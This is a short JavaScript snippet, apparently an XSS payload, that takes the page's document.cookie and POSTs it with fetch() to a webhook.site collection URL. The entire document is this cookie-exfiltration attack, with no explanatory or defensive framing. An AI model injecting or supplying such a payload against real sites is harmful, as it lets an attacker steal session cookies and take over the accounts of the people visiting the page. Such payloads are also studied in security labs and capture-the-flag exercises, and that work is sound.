var webhook = "https://webhook.site/04d732b9-ea06-4d98-97c9-7d9551251e73"

fetch(webhook, 
  {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(document.cookie),
  }
)
